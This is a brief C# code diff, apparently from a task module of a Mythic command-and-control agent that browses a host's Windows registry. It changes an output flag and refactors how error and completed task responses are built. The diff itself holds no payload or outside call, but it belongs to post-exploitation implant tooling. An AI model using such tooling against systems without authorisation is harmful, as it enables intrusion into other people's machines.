@@ -143,7 +143,7 @@ namespace Tasks
             string error = "";
             CustomBrowser customBrowser = new CustomBrowser();
             customBrowser.BrowserName = "registry_browser";
-            customBrowser.SetAsUserOutput = true;
+            customBrowser.SetAsUserOutput = false;
             customBrowser.Host = Environment.GetEnvironmentVariable("COMPUTERNAME");
             customBrowser.Entries = new List<CustomBrowserEntry>();
             CustomBrowserEntry customBrowserEntry = new CustomBrowserEntry();
@@ -248,13 +248,23 @@ namespace Tasks
                 error += $"\n{ex.Message}";
             }
             customBrowser.Entries.Add(customBrowserEntry);
-            if (results.Count == 0)
+            if (results.Count == 0 && !string.IsNullOrWhiteSpace(error))
             {
-                resp = CreateTaskResponse(error, true, "error", artifacts.ToArray());
+                resp = CreateTaskResponse(
+                    error,
+                    true,
+                    "error",
+                    artifacts.ToArray()
+                );
             }
             else
             {
-                resp = CreateTaskResponse(_jsonSerializer.Serialize(results.ToArray()), true, "completed", artifacts.ToArray());
+                resp = CreateTaskResponse(
+                    _jsonSerializer.Serialize(results.ToArray()),
+                    true,
+                    "completed",
+                    artifacts.ToArray()
+                );
             }
             _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                 "", false, "", new IMythicMessage[]
